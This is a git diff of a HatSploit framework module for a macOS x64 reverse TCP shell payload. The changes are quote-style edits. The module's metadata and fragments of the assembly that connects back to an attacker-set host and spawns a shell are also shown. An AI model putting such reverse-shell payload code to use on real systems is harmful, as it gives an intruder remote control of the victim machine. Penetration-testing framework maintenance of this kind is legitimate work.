@@ -10,22 +10,22 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Assembler, Socket):
     details = {
-        "Name": "macOS x64 Shell Reverse TCP",
-        "Payload": "macos/x64/shell_reverse_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Shell reverse TCP payload for macOS x64.",
-        "Architecture": "x64",
-        "Platform": "macos",
-        "Rank": "high",
-        "Type": "reverse_tcp",
+        'Name': "macOS x64 Shell Reverse TCP",
+        'Payload': "macos/x64/shell_reverse_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Shell reverse TCP payload for macOS x64.",
+        'Architecture': "x64",
+        'Platform': "macos",
+        'Rank': "high",
+        'Type': "reverse_tcp",
     }
 
     def run(self):
-        rhost = self.pack_host(self.handler["RHOST"])
-        rport = self.pack_port(self.handler["RPORT"])
+        rhost = self.pack_host(self.handler['RHOST'])
+        rport = self.pack_port(self.handler['RPORT'])
 
         return self.assemble(
-            self.details["Architecture"],
+            self.details['Architecture'],
             f"""
             start:
                 mov r8b, 0x02
@@ -77,5 +77,5 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 mov rdi, rsp
                 xor rsi, rsi
                 syscall
-            """,
+            """
         )
